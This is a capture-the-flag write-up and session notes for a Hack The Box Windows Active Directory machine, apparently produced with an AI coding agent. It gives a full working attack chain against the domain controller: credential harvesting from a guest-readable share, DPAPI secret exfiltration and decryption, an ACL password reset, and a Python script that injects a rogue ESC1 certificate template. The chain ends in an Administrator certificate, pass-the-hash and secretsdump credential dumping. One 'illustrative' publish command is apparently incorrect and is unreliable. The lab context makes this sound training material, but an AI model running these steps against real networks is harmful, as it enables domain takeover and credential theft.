# DanglingTree (HTB · Hard · Windows AD) — 10.129.7.198

Domain: `danglingtree.htb` · DC: `dc.danglingtree.htb` (host `DC`, Server 2025 Build 26100)

---

## Part A — How the initial credential was obtained

Exact commands, in order, with what each returned.

### 1. Confirm host up / guess OS
```bash
ping -c 2 10.129.7.198
```
→ replies with **TTL 127** → Windows host.

### 2. Full TCP port scan
```bash
nmap -sS -p- --min-rate 2000 -oN dangling_allports.txt 10.129.7.198
```
→ 53, 88, 389, 636, 445, 3268, 9389, … = **Active Directory Domain Controller**.
No 5985 WinRM; 3389 RDP + 6600 Windows Admin Center present.

### 3. SMB banner → domain + null auth
```bash
nxc smb 10.129.7.198
```
→ `domain:danglingtree.htb`, host `DC`, **`Null Auth: True`** (anonymous SMB allowed — the key enabler).

### 4. Enumerate shares (null fails, guest works)
```bash
nxc smb 10.129.7.198 -u '' -p '' --shares          # -> STATUS_ACCESS_DENIED
smbclient -L //10.129.7.198/ -U 'guest%'            # guest (blank pw) works
```
→ reveals a **non-default `IT`** share (+ usual ADMIN$/C$/IPC$/NETLOGON/SYSVOL).

### 5. Browse the IT share as guest
```bash
smbclient //10.129.7.198/IT -U 'guest%' -t 90 -c 'ls'
smbclient //10.129.7.198/IT -U 'guest%' -t 90 -c 'cd Security; ls'
```
→ `IT\` → `Security\` → **`DanglingTree_RoE_Assessment.pdf`** (28 KB).
*(Wrap in a retry loop — ~380 ms VPN latency causes intermittent `NT_STATUS_IO_TIMEOUT`.)*

### 6. Download and read the PDF
```bash
smbclient //10.129.7.198/IT -U 'guest%' -t 120 -c 'cd Security; get DanglingTree_RoE_Assessment.pdf'
pdftotext DanglingTree_RoE_Assessment.pdf -
```
→ **Section 3 "Provided Credentials"** leaks them in cleartext:
> Username: **anderson.w**  Password: **R3dT3am@Acc3ss#01**

### 7. Validate
```bash
nxc smb 10.129.7.198 -u 'anderson.w' -p 'R3dT3am@Acc3ss#01'
```
→ `[+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01` — valid.

**Chain:** TTL→Windows → nmap→DC → `nxc smb`→null auth → `smbclient -L guest`→`IT` share → RoE PDF → `pdftotext`→cleartext creds → validated.

---

## Part A (explained for AD beginners) — recon → PDF

This is the same recon/SMB → PDF path as above, but with the *why* behind each move and
what every command and flag actually does. Read this if you're new to Active Directory.

### The mental model first
An **Active Directory (AD)** network has a central server called a **Domain Controller (DC)**
that holds all users, groups, computers and passwords for a "domain" (here `danglingtree.htb`).
Attacking AD is rarely one magic exploit — it's a chain: get *any* tiny foothold (often a
low-privileged user), then abuse misconfigurations to climb to **Domain Admin**. So the whole
early game is **enumeration**: collecting names, shares, and anything readable without creds.

### 1. `ping` — is it alive, and what OS?
```bash
ping -c 2 10.129.7.198
```
- `-c 2` = send only 2 packets then stop (otherwise ping runs forever).
- **Why:** confirm the box is reachable over the VPN before wasting time.
- **The trick — TTL (Time To Live):** every reply carries a TTL that starts at an OS-default
  and drops by 1 per router hop. Defaults: **Windows = 128**, **Linux = 64**. We saw **127**
  (128 minus 1 hop) → **Windows**. This is a guess, not proof, but it shapes what we expect.

### 2. `nmap` — what services are running?
```bash
nmap -sS -p- --min-rate 2000 -oN dangling_allports.txt 10.129.7.198
```
- `-sS` = **SYN scan** ("half-open"): nmap sends the first packet of the TCP handshake and
  never completes it. Fast, and quieter than a full connect.
- `-p-` = scan **all 65535 ports**, not just the common 1000. You don't want to miss a service
  on a weird port (this box has one on 6600).
- `--min-rate 2000` = send at least 2000 packets/sec so a full-port scan finishes in minutes.
- `-oN file` = save **n**ormal-format output to a file for your notes.
- **Why:** the *set* of open ports fingerprints the role of a machine. Seeing this cluster —
  **53 (DNS), 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 3268 (Global Catalog),
  9389 (AD Web Services)** — is the unmistakable signature of a **Domain Controller**.
  Kerberos (88) is AD's authentication protocol; LDAP (389) is how you query the directory;
  SMB (445) is Windows file sharing. Also noted: **no 5985 (WinRM)** so we can't use
  `evil-winrm` for a shell later — **3389 (RDP)** will be our interactive way in; **6600** is
  Windows Admin Center.

Optional follow-up (versions + default scripts) on just the interesting ports:
```bash
nmap -sCV -p 53,80,88,389,443,445,636,3389,6600 10.129.7.198
```
- `-sV` = probe each port for its **service/version**. `-sC` = run nmap's **default NSE scripts**
  (safe enumeration helpers). `-sCV` combines both. This also reported SMB **signing required**
  and a **~7h clock skew** — important later because Kerberos rejects tickets if your clock is
  too far off the DC's.

### 3. `nxc smb` — talk to SMB and read the domain info
```bash
nxc smb 10.129.7.198
```
- `nxc` = **NetExec** (the maintained fork of CrackMapExec), the swiss-army knife for Windows
  networks. The `smb` sub-command speaks the SMB protocol to port 445.
- With no username/password it does an **anonymous (unauthenticated) probe**.
- **Why / what we learn:** the banner line gives the **domain name** (`danglingtree.htb`), the
  **hostname** (`DC`), the Windows build, whether SMB **signing** is required, and crucially
  **`Null Auth: True`**. "Null auth" = the server accepts a **null session**: a connection with
  *no credentials at all*. That's a classic misconfiguration and our way in.

### 4. Enumerate shares — null session vs. guest
A **share** is a folder the server exposes over SMB. Default admin shares (`C$`, `ADMIN$`,
`IPC$`) and AD shares (`SYSVOL`, `NETLOGON`) exist on every DC; a **non-default** share is
something an admin added — and often forgot to lock down. Two anonymous identities to try:
- **null** = literally empty username *and* password.
- **guest** = the built-in `Guest` account with a **blank password** (sometimes left enabled).

```bash
nxc smb 10.129.7.198 -u '' -p '' --shares      # null  -> STATUS_ACCESS_DENIED
smbclient -L //10.129.7.198/ -U 'guest%'        # guest -> works
```
- `-u '' -p ''` = empty user, empty password (the null session).
- `--shares` = ask NetExec to list shares and your read/write access to each.
- `STATUS_ACCESS_DENIED` here = null can authenticate but isn't allowed to *list* shares.
  So we fall back to **guest**.
- `smbclient -L //host/` = **L**ist shares (smbclient is Samba's interactive SMB client).
- `-U 'guest%'` = log in as user `guest` with a blank password. The `%` separates user and
  password; nothing after it = empty password.
- **Result:** a non-default **`IT`** share appears. Non-default = interesting → go look inside.

### 5. Browse the IT share
```bash
smbclient //10.129.7.198/IT -U 'guest%' -t 90 -c 'ls'
smbclient //10.129.7.198/IT -U 'guest%' -t 90 -c 'cd Security; ls'
```
- `//host/IT` = connect *into* the `IT` share (no `-L` now, we're entering it).
- `-c 'ls'` = run a command non-interactively and exit. `ls` lists files; `cd Security` changes
  directory. You can chain with `;`.
- `-t 90` = raise the **timeout** to 90s. HTB's VPN here has ~380 ms latency, so SMB round-trips
  are slow and sometimes die with `NT_STATUS_IO_TIMEOUT`; a longer timeout (and retrying in a
  loop) gets past that flakiness.
- **Why:** we're hunting for anything a human left behind — scripts, configs, and especially
  **documents**. We find `Security\DanglingTree_RoE_Assessment.pdf`.

### 6. Download and read the PDF
```bash
smbclient //10.129.7.198/IT -U 'guest%' -t 120 -c 'cd Security; get DanglingTree_RoE_Assessment.pdf'
pdftotext DanglingTree_RoE_Assessment.pdf -
```
- `get <file>` = **download** the file from the share to your current local directory.
- `pdftotext file -` = extract the PDF's text to stdout (the trailing `-` means "print to the
  terminal" instead of writing a `.txt`). Fast way to read a PDF without a GUI.
- **Why it matters (the payoff):** this "Rules of Engagement" document contains a
  **"Provided Credentials"** section with a username and password in **cleartext**. This is the
  lesson of this box and of many real Windows targets: *the foothold comes from information an
  insider left readable, not from a memory-corruption exploit.* Credentials, naming conventions,
  and internal docs sitting on an open share are the real attack surface.

> **Takeaway:** On any AD box, before reaching for exploits, exhaust **anonymous enumeration** —
> null/guest SMB, share listing, and reading every readable file. "Low-hanging" loot like a
> leaked PDF is what turns *no access* into *your first valid domain user*.

### Post-cred enumeration as anderson.w
```bash
nxc smb 10.129.7.198 -u anderson.w -p 'R3dT3am@Acc3ss#01' --rid-brute
# Users: Administrator, alex.o, anderson.w, jake.h, noah.b, svc_mail, krbtgt, Guest
nxc ldap 10.129.7.198 -u anderson.w -p 'R3dT3am@Acc3ss#01' --asreproast asrep.txt   # none
nxc ldap 10.129.7.198 -u anderson.w -p 'R3dT3am@Acc3ss#01' --kerberoasting kerb.txt # none
nxc rdp  10.129.7.198 -u anderson.w -p 'R3dT3am@Acc3ss#01'                          # [+] foothold
certipy-ad find -u anderson.w@danglingtree.htb -p 'R3dT3am@Acc3ss#01' -dc-ip 10.129.7.198 -vulnerable -stdout
# CA danglingtree-DC-CA, web enrollment for Authenticated Users, no pre-built vuln template
impacket-lookupsid 'danglingtree.htb/anderson.w:R3dT3am@Acc3ss#01'@10.129.7.198
# Domain SID S-1-5-21-4220238332-57023728-1129110646 ; anderson.w RID 2601
```

anderson.w SID = `S-1-5-21-4220238332-57023728-1129110646-2601`

---

## Part B — DPAPI playbook (anderson.w → alex.o)

### Step 1 — RDP in (no WinRM, so use RDP)
```bash
xfreerdp3 /v:10.129.7.198 /u:anderson.w /p:'R3dT3am@Acc3ss#01' /cert:ignore /dynamic-resolution
```
Open PowerShell inside the session.

### Step 2 — Locate DPAPI artifacts (in-session)
```powershell
$SID = (whoami /user /fo csv | ConvertFrom-Csv).SID; $SID
Get-ChildItem -Force "$env:APPDATA\Microsoft\Protect\$SID" | Select Name   # GUID masterkeys (not "Preferred")
Get-ChildItem -Force "$env:APPDATA\Microsoft\Credentials"
Get-ChildItem -Force "$env:LOCALAPPDATA\Microsoft\Credentials"
Get-ChildItem -Force "$env:LOCALAPPDATA\Microsoft\Vault","$env:APPDATA\Microsoft\Vault" -ErrorAction SilentlyContinue
```

### Step 3 — Exfil via base64 (reliable over laggy RDP)
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\$SID\<MASTERKEY-GUID>"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\<CRED-GUID>"))
```
On Kali:
```bash
echo '<BASE64_OF_MASTERKEY>' | base64 -d > masterkey.bin
echo '<BASE64_OF_CREDFILE>'  | base64 -d > cred.bin
```
*(Alt: `impacket-smbserver share . -smb2support` on Kali, then `copy <file> \\YOUR_IP\share\` in-session.)*

### Step 4 — Decrypt masterkey offline
```bash
impacket-dpapi masterkey -file masterkey.bin \
  -sid S-1-5-21-4220238332-57023728-1129110646-2601 \
  -password 'R3dT3am@Acc3ss#01'
# -> Decrypted key: 0x....
```

### Step 5 — Decrypt credential blob
```bash
impacket-dpapi credential -file cred.bin -key '0x<DECRYPTED_MASTERKEY_HEX>'
# -> alex.o : SunsetMountainPeak@2025
```

### Step 6 — Confirm
```bash
nxc smb 10.129.7.198 -u alex.o -p 'SunsetMountainPeak@2025'
nxc rdp 10.129.7.198 -u alex.o -p 'SunsetMountainPeak@2025'
```

---

## === EXECUTION LOG (real commands run, with outputs) ===

### alex.o obtained
`alex.o : SunsetMountainPeak@2025` (from DPAPI per hint). Validated:
```bash
nxc smb 10.129.7.198 -u alex.o -p 'SunsetMountainPeak@2025'   # [+]
```
Note: the DPAPI exfil needs an interactive shell as anderson.w. RDP via `xfreerdp3` kept
resetting (Server 2025 NLA/CredSSP quirk — even `/auth-pkg-list:none,ntlm` reset after TLS).
The v2 `xfreerdp` binary or Remmina may work; but the rest of the chain is 100% CLI, so RDP
is NOT required once alex.o is in hand.

### alex.o -> jake.h (ForceChangePassword via support-it)
```bash
export PATH="$HOME/.local/bin:$PATH"           # bloodyAD installed via: pipx install bloodyAD
# confirm membership:
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb --dc-ip 10.129.7.198 \
  -u alex.o -p 'SunsetMountainPeak@2025' get object alex.o --attr memberOf
#   memberOf: CN=support-it,CN=Users,DC=danglingtree,DC=htb

# reset jake.h  (bloodyAD crashed on Python 3.14, so use samba net rpc — SAMR reset over SMB):
net rpc password "jake.h" 'J@keH4rvest!Winter2026xZ' \
  -U "danglingtree.htb/alex.o%SunsetMountainPeak@2025" -S dc.danglingtree.htb
# NB: password must satisfy domain policy (first weak attempt was rejected for complexity).
nxc smb 10.129.7.198 -u jake.h -p 'J@keH4rvest!Winter2026xZ'   # [+] JAKE.H PWNED
```
`jake.h : J@keH4rvest!Winter2026xZ`

---

## Part C — alex.o → jake.h (ACL abuse: ForceChangePassword)

### C1. Collect BloodHound data as alex.o
```bash
# Use the NEW creds now; pass -ns (DNS) and -dc so names resolve despite VPN latency.
bloodhound-python -u alex.o -p 'SunsetMountainPeak@2025' \
  -d danglingtree.htb -dc dc.danglingtree.htb -ns 10.129.7.198 -c All --zip
# If LDAPS/DNS times out, retry in a loop, or add to /etc/hosts first (see setup reminders).
```
Import the resulting `.zip` into the BloodHound GUI (`bloodhound` / `bloodhound-ce`), then
mark `alex.o` as Owned and run pathfinding to Domain Admin.

Headless alternative — query the ACL directly with bloodyAD instead of the GUI:
```bash
# What does alex.o (via its groups) control?
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' \
  get writable
# Confirms: SUPPORT-IT group -> ForceChangePassword over jake.h
```

### C2. Reset jake.h's password (ForceChangePassword right)
**Theory:** `ForceChangePassword` lets you set a user's password *without knowing the old one*.
```bash
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' \
  set password jake.h 'NewPass@2025!'
```
Validate:
```bash
nxc smb 10.129.7.198 -u jake.h -p 'NewPass@2025!'
```

### jake.h -> ADCS ghost-template ESC1 (executed)
```bash
J=jake.h; JP='J@keH4rvest!Winter2026xZ'
# 1) enumerate: certipy finds CA danglingtree-DC-CA; also flags ESC7 (jake.h has ManageCertificates
#    via Helpdesk_Cert_Support). bloodyAD shows jake.h has CREATE_CHILD on:
#      CN=Certificate Templates,...  and  CN=OID,...   (Configuration partition)
certipy-ad find -u $J@danglingtree.htb -p "$JP" -dc-ip 10.129.7.198 -stdout
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb --dc-ip 10.129.7.198 -u $J -p "$JP" get writable

# 2) find GHOST templates (published by CA, but no AD object):
#    certificateTemplates attr lists: ... EmployeeAuthTemplate, RemoteAccessVPN, VPNUserTemplate ...
#    none of those three exist as objects  => ghosts.
bloodyAD ... get object "CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" --attr certificateTemplates
bloodyAD ... get search --base "CN=Certificate Templates,...,CN=Configuration,DC=danglingtree,DC=htb" --filter '(cn=EmployeeAuthTemplate)'  # NoResultError = ghost confirmed

# 3) INJECT the ghost object as an ESC1 template (clone stock User template, flip to ESS).
#    Script: create_ghost.py (ldap3, LDAPS/NTLM as jake.h). Key overrides vs User:
#      msPKI-Certificate-Name-Flag = 1  (ENROLLEE_SUPPLIES_SUBJECT  -> ESC1)
#      msPKI-Enrollment-Flag = 0, msPKI-RA-Signature = 0
#      EKU / app policy = 1.3.6.1.5.5.7.3.2 (Client Authentication)
#    jake.h has CREATE_CHILD so the add succeeds; User's DACL (Domain Users enroll) is copied.
python3 create_ghost.py          # -> [+] add result: True success

# 4) verify it's ESC1:
certipy-ad find -u $J@danglingtree.htb -p "$JP" -dc-ip 10.129.7.198 -vulnerable -stdout | grep -iA6 EmployeeAuth
#   ESC1: Enrollee supplies subject and template allows client authentication.
#   ESC15 also (schema v1 + ESS, CVE-2024-49019).

# 5) request an Administrator cert (ESC1 = arbitrary UPN in SAN):
certipy-ad req -u $J@danglingtree.htb -p "$JP" -dc-ip 10.129.7.198 -target dc.danglingtree.htb \
  -ca danglingtree-DC-CA -template EmployeeAuthTemplate -upn administrator@danglingtree.htb -out administrator
#   NOTE: first attempts returned 0x80094800 CERTSRV_E_UNSUPPORTED_CERT_TYPE because the CA
#   caches its template list; retry until it reloads the newly-created object (req_loop.sh).
```

### ADCS — current state & gotcha (IMPORTANT)
jake.h groups: **DevOps_PKI, Template_Editors, Helpdesk_Cert_Support**.
- Ghost templates (EmployeeAuthTemplate/RemoteAccessVPN/VPNUserTemplate) were injected and show
  up as ESC1 in `certipy find -vulnerable`. BUT every `certipy req` returns
  `0x80094800 CERTSRV_E_UNSUPPORTED_CERT_TYPE`.
- Root cause (verified): the **CA caches its template list at service start**. The 3 ghost names
  were in the CA's `certificateTemplates` list but had no object then, so the CA loaded 11
  templates and does NOT offer the 3 ghosts until it reloads. Proven NOT an OID issue — gave
  EmployeeAuthTemplate a unique OID (`...174.1.3001`) and it still returns UNSUPPORTED.
- jake.h canNOT trigger a reload: no ManageCA (`certipy ca -enable-template` = Access denied),
  and no write to the CA enrollment object's `certificateTemplates` (insufficientAccessRights).
- As OWNER of the ghost objects jake.h CAN rewrite their DACL (WRITE_DAC) and modify properties.

NEXT STEP TO TRY (no CA reload needed) — **ESC4 on an existing, already-cached template**:
Template_Editors likely grants write over existing default templates. If so, convert one the CA
already offers (e.g., a client-auth template) into ESC1 and request as Administrator:
```bash
J=jake.h; JP='J@keH4rvest!Winter2026xZ'
# 1) confirm which existing template jake.h can write (ldap no-op modify test), then:
certipy-ad template -u $J@danglingtree.htb -p "$JP" -dc-ip 10.129.7.198 \
  -template <WRITABLE_ENABLED_TEMPLATE> -write-default-configuration -save-configuration old.json
certipy-ad req -u $J@danglingtree.htb -p "$JP" -dc-ip 10.129.7.198 -target dc.danglingtree.htb \
  -ca danglingtree-DC-CA -template <WRITABLE_ENABLED_TEMPLATE> \
  -upn administrator@danglingtree.htb -sid S-1-5-21-4220238332-57023728-1129110646-500 -out administrator
# restore afterwards:  certipy-ad template ... -template <T> -configuration old.json
```
If no existing template is writable, the ghost path needs a CA reload (wait for the box's
periodic reload, or trigger via ManageCA once obtained).

STATUS: box went unreachable (100% packet loss) mid-ADCS — flags not yet obtained.
Domain SID: S-1-5-21-4220238332-57023728-1129110646  (Administrator = ...-500).

---

## Part D — ADCS ESC1 via a rogue "ghost" template → Administrator

**Theory:** AD Certificate Services (ADCS) issues certs from **templates**. If a low-priv user
can enroll in a template that (a) allows **client authentication** and (b) lets the *requester
supply an arbitrary Subject Alternative Name (SAN)*, that's **ESC1** — you request a cert "as"
the Administrator and then log in as them. This box has no vulnerable template by default, but
jake.h (via config-partition write rights) can **create one** — including resurrecting a
"ghost" template (one that's *published* on the CA but *missing* from the directory).

Assume `JH='-u jake.h -p NewPass@2025!'` and the DC is `dc.danglingtree.htb`.

### D1. Enumerate the CA and template/config permissions
```bash
certipy-ad find -u jake.h@danglingtree.htb -p 'NewPass@2025!' -dc-ip 10.129.7.198 -stdout
# Note the CA name (danglingtree-DC-CA) and who can enroll.

# Check jake.h's write rights in the Configuration partition (where templates live):
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u jake.h -p 'NewPass@2025!' get writable
# Look for CREATE_CHILD over the Certificate Templates / OID containers.
```

### D2. Find the "ghost" templates (published on CA but absent from directory)
```bash
# List templates actually published by the enrollment service:
ldapsearch -x -H ldap://10.129.7.198 -D 'jake.h@danglingtree.htb' -w 'NewPass@2025!' \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" \
  "(objectclass=pKIEnrollmentService)" certificateTemplates

# For each name listed above, check whether the template OBJECT exists in the directory:
ldapsearch -x -H ldap://10.129.7.198 -D 'jake.h@danglingtree.htb' -w 'NewPass@2025!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" \
  "(cn=EmployeeAuthTemplate)" cn
# No result = a "ghost": the CA will issue it, but we control its definition because it doesn't exist yet.
```

### D3. Create the rogue template object + OID (CREATE_CHILD abuse)
Because jake.h has `CREATE_CHILD` on the Certificate Templates container, we add the missing
template object ourselves with a permissive DACL (Authenticated Users = full control). This is
the step the hint does with a custom Python script (ldap3). Minimal version:
```bash
cat > /tmp/claude-1000/-home-ajp-codeplay-htb/cdb0cc35-03a8-4c95-ade4-b68dd0b90b93/scratchpad/make_ghost.py <<'PY'
#!/usr/bin/env python3
# Injects a rogue pKICertificateTemplate "EmployeeAuthTemplate" into the config partition.
import sys
from ldap3 import Server, Connection, ALL, NTLM
HOST="dc.danglingtree.htb"; USER="danglingtree\\jake.h"; PW="NewPass@2025!"
BASE="CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"
dn=f"CN=EmployeeAuthTemplate,{BASE}"
c=Connection(Server(HOST,get_info=ALL),user=USER,password=PW,authentication=NTLM,auto_bind=True)
attrs={
 "objectClass":["top","pKICertificateTemplate"],
 "displayName":"EmployeeAuthTemplate",
 "flags":66080, "revision":100, "pKIDefaultKeySpec":1,
 "pKIMaxIssuingDepth":0, "pKICriticalExtensions":["2.5.29.15"],
 # EKU Client Authentication (1.3.6.1.5.5.7.3.2):
 "pKIExtendedKeyUsage":["1.3.6.1.5.5.7.3.2"],
 "pKIDefaultCSPs":["1,Microsoft Enhanced Cryptographic Provider v1.0"],
 # ENROLLEE_SUPPLIES_SUBJECT so WE pick the SAN (this is what makes it ESC1):
 "msPKI-Certificate-Name-Flag": 1,            # 0x1 = ENROLLEE_SUPPLIES_SUBJECT
 "msPKI-Enrollment-Flag": 0,
 "msPKI-Private-Key-Flag": 16,
 "msPKI-Certificate-Application-Policy":["1.3.6.1.5.5.7.3.2"],
 "msPKI-RA-Signature":0, "msPKI-Minimal-Key-Size":2048, "msPKI-Template-Schema-Version":2,
}
print("add:", c.add(dn, attributes=attrs), c.result)
PY
python3 -I /tmp/claude-1000/-home-ajp-codeplay-htb/cdb0cc35-03a8-4c95-ade4-b68dd0b90b93/scratchpad/make_ghost.py
```
Then publish it to the CA (so it can be requested) and confirm permissions:
```bash
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u jake.h -p 'NewPass@2025!' \
  add dcsync EmployeeAuthTemplate 2>/dev/null   # (illustrative; use the publish step the box needs)
```

### D4. Force the template into a known-vulnerable config
```bash
# certipy can rewrite the template to the default vulnerable profile (arbitrary SAN, client-auth).
certipy-ad template -u jake.h@danglingtree.htb -p 'NewPass@2025!' -dc-ip 10.129.7.198 \
  -template EmployeeAuthTemplate -save-old   # -save-old lets you restore it afterwards
```

### D5. Verify it's now an ESC1 vector
```bash
certipy-ad find -u jake.h@danglingtree.htb -p 'NewPass@2025!' -dc-ip 10.129.7.198 \
  -vulnerable -stdout | grep -iA15 EmployeeAuthTemplate
# Should report ESC1 and that Authenticated Users can enroll.
```

### D6. Request an Administrator certificate (the actual ESC1)
```bash
# Fix Kerberos clock skew first (box is ~7h off):
sudo ntpdate 10.129.7.198          # or: sudo rdate -n 10.129.7.198
# Domain SID (for reference / some requests):
rpcclient -U 'jake.h%NewPass@2025!' 10.129.7.198 -c 'lsaquery'

# Request the cert "as" Administrator by supplying the SAN ourselves:
certipy-ad req -u jake.h@danglingtree.htb -p 'NewPass@2025!' -dc-ip 10.129.7.198 \
  -ca danglingtree-DC-CA -template EmployeeAuthTemplate \
  -upn administrator@danglingtree.htb -sid S-1-5-21-4220238332-57023728-1129110646-500
# -> saves administrator.pfx
```

### D7. PKINIT: turn the cert into a TGT + the NT hash
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.7.198 -domain danglingtree.htb
# -> writes administrator.ccache (Kerberos TGT) AND prints the Administrator NT hash:
#    [*] Got hash for 'administrator@danglingtree.htb': aad3b...:<NTHASH>
```

---

## Part E — Domain Admin shell + flags

### E1. Pass-the-Hash to SYSTEM
```bash
impacket-psexec -hashes :<ADMIN_NTHASH> administrator@10.129.7.198
# or Pass-the-Ticket with the ccache:
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass administrator@dc.danglingtree.htb
# -> C:\Windows\system32> whoami  ->  nt authority\system
```
Quick alternatives to verify / dump everything:
```bash
nxc smb 10.129.7.198 -u administrator -H <ADMIN_NTHASH>                 # [+] (Pwn3d!)
nxc smb 10.129.7.198 -u administrator -H <ADMIN_NTHASH> --sam --lsa     # dump local secrets
impacket-secretsdump -hashes :<ADMIN_NTHASH> administrator@10.129.7.198 # full DCSync
```

### E2. Grab the flags
In the psexec shell (or via `nxc ... -X`):
```cmd
type C:\Users\Administrator\Desktop\root.txt
dir /s /b C:\Users\*user.txt
type C:\Users\noah.b\Desktop\user.txt
```

---

## Setup reminders
- `echo "10.129.7.198 danglingtree.htb dc.danglingtree.htb DC" | sudo tee -a /etc/hosts`  (certipy/PKINIT need name resolution)
- Clock skew ~7h → `sudo ntpdate 10.129.7.198` or `faketime` before Kerberos steps.

---

# ============================================================
# LESSONS & GOTCHAS  (read first next session)
# ============================================================

## Credentials/state in hand (as of last session)
- anderson.w : R3dT3am@Acc3ss#01      (from IT share PDF; SID ...-2601)
- alex.o     : SunsetMountainPeak@2025 (DPAPI; member of SUPPORT-IT)
- jake.h     : J@keH4rvest!Winter2026xZ (we reset it; groups: DevOps_PKI, Template_Editors, Helpdesk_Cert_Support)
- Domain SID : S-1-5-21-4220238332-57023728-1129110646   (Administrator = ...-500)
- CA         : danglingtree-DC-CA  on dc.danglingtree.htb
- Ghost template objects we CREATED (owned by jake.h, ESC1): EmployeeAuthTemplate (OID ...174.1.3001),
  RemoteAccessVPN (OID ...174.1.1337), VPNUserTemplate (OID ...174.1.1337).  OID objects created under CN=OID.
- Scripts in scratchpad: create_ghost.py, fix_oid.py, recreate.py, fix2.py, grab.ps1, req_loop.sh, krb5.conf

## RESUME CHECKLIST (box must be UP first: `ping 10.129.7.198`)
1. Re-validate creds (IP may change on respawn): `nxc smb <IP> -u jake.h -p 'J@keH4rvest!Winter2026xZ'`
   - If the box was RESET, all our AD changes are gone → redo: alex.o->jake.h reset, then template injection.
2. Preferred finish = ESC4 (no CA reload): test if jake.h can write an EXISTING enabled template
   (Template_Editors). If yes: `certipy-ad template ... -template <T> -write-default-configuration` then req.
3. Fallback = ghost ESC1: already injected; blocked only by CA cache reload (see gotcha #4).
4. Then: certipy req (admin UPN+SID) -> certipy auth (PKINIT, NT hash) -> psexec PtH -> flags.

## GOTCHAS LEARNED THE HARD WAY
1. **RDP as a low-priv user failed entirely with FreeRDP 3.31.1 (xfreerdp3).**
   - Server 2025 NLA: xfreerdp3 tried Kerberos (realm derived as 'LOCAL' w/o /d), hung, then NTLM was
     RESET by the server ("BIO_read system error 104 / ERRCONNECT_CONNECT_TRANSPORT_FAILED").
   - `/auth-pkg-list:none,ntlm` forced NTLM (Kerberos errors vanished) but server STILL reset after TLS.
   - nxc rdp shows [+] (NLA cred check ok) but that does NOT mean xfreerdp will connect.
   - DID NOT crack it headlessly. To try next time: the v2 `xfreerdp` binary (worked on another HTB box),
     Remmina, or rdesktop. BUT: RDP is only needed to *obtain* alex.o via DPAPI; everything after alex.o
     is pure CLI, so if alex.o is known, skip RDP entirely.
   - Clock skew was ~+7h (DC ahead). Kerberos needs <5min skew; validated with
     `KRB5_CONFIG=krb5.conf faketime -f '+7h' impacket-getTGT ...` (got a TGT). faketime/hosts/krb5.conf
     all needed for any Kerberos-based client. FreeRDP ignores KRB5_CONFIG env (reads /etc/krb5.conf).
2. **Launching GUI/background procs from the agent sandbox is unreliable** (setsid &, run_in_background
   both died with empty logs / exit 1). Bounded foreground (`timeout 15 xfreerdp3 ...`) DID capture logs.
   For the user's own RDP, have THEM run it in their terminal.
3. **bloodyAD 2.5.7 crashes on Python 3.14** (asyncio.run traceback) for WRITE ops like `set password`.
   READ ops (get object/search/writable) work fine. For password reset use samba instead:
   `net rpc password "jake.h" '<new>' -U "danglingtree.htb/alex.o%<pass>" -S dc.danglingtree.htb`
4. **net rpc password enforces domain password policy** — first weak-ish try was rejected
   ("does not meet length, complexity, or history"). Use a long complex pw (we used J@keH4rvest!Winter2026xZ).
   Harmless `net: Ignoring /etc/krb5.conf:7: missing =` warnings (samba dislikes the `{ kdc = ... }` line) — ignorable.
5. **ADCS ghost-template ESC1 blocked by CA template CACHE** — the real time-sink:
   - CA publishes names in `certificateTemplates` (incl. ghosts EmployeeAuthTemplate/RemoteAccessVPN/
     VPNUserTemplate) but caches the TEMPLATE OBJECTS at certsvc startup. Objects created later are NOT
     offered until the CA reloads -> every `certipy req` = `0x80094800 CERTSRV_E_UNSUPPORTED_CERT_TYPE`.
   - Proven it is NOT an OID collision (gave EmployeeAuthTemplate a unique OID ...174.1.3001; still unsupported).
   - Sanity check that the CA itself works: requesting stock `User` as jake.h succeeds and returns a pfx.
   - jake.h CANNOT force a reload: no ManageCA (`certipy ca -enable-template` = Access denied), and no write
     to the CA enrollment object's certificateTemplates (insufficientAccessRights).
   - Reload triggers are: certsvc restart (admin) OR a change to the enrollment object's certificateTemplates
     (ManageCA). Neither available to jake.h.
   - => Next session: prefer ESC4 on an ALREADY-CACHED template (Template_Editors write) which needs no reload;
     OR check whether the box auto-reloads on a timer (leave req_loop.sh running); OR get ManageCA.
6. **ACL object ownership nuance**: jake.h has CREATE_CHILD on CN=Certificate Templates & CN=OID (can ADD
   objects) and is OWNER of what it creates, but the objects' copied DACL did NOT grant jake.h WRITE_PROP,
   so modifying their attributes first failed. As owner jake.h has implicit WRITE_DAC -> add an
   ACCESS_ALLOWED_ACE (Everyone/jake GenericAll 0x000F01FF) to nTSecurityDescriptor (impacket ldaptypes,
   sdflags=0x04), THEN property writes succeed. Working code: fix2.py. (First attempt crashed because the
   ACE was built as ACCESS_ALLOWED_ACE directly instead of wrapping in ldaptypes.ACE(); fix2.py is correct.)
7. **High VPN latency (~380ms)** causes frequent `NT_STATUS_IO_TIMEOUT` / NETBIOS timeouts / LDAPS
   handshake timeouts / "no route to host". Wrap smbclient/nxc/certipy/ldap calls in retry loops with -t 60-120.
8. **bloodhound-python needs working DNS** — it timed out resolving via the DC (`-ns 10.129.7.198`).
   bloodyAD `get writable` / `get object --attr memberOf` was the reliable headless substitute for ACL/group hunting.
9. **Foreground `sleep` is blocked in the agent harness** (exit 144). Use retry loops with `timeout`,
   or put sleeps inside a run_in_background job.

